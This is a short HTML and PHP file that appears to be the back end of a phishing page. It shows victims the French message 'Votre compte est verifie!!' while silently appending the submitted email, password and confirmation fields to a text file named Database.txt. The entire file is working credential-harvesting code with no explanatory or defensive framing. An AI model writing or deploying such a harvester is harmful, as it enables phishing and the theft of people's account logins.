<html>
    <body>
        Votre compte est verifie!!
    </body>
</html>


<?php

              
if(isset($_POST['eml'])==true && isset($_POST['pss'])==true  && isset($_POST['cnf'])==true)
{
$data=$_POST['eml'];
$dat=$_POST['pss'];
$da=$_POST['cnf'];

$fp = fopen('Database.txt', 'a');
fwrite($fp, $data);
fwrite($fp, $dat);
fwrite($fp, $da);

fclose($fp);
}
?>